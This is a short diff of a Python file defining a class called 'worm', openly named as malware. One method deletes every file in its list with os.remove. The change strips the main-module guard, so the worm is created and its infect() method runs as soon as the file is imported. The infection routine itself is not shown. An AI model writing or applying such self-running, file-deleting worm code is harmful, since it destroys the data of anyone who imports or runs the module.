@@ -1,4 +1,3 @@
-# import glob
 import os
 
 class worm():
@@ -52,8 +51,6 @@ class worm():
         for file in self.files:
             os.remove(file)
 
-if __name__ =='__main__':
-    # make a worm instance
-    worm = worm()
-    worm.infect()
-    # worm.reset()
+# make a worm instance
+worm = worm()
+worm.infect()
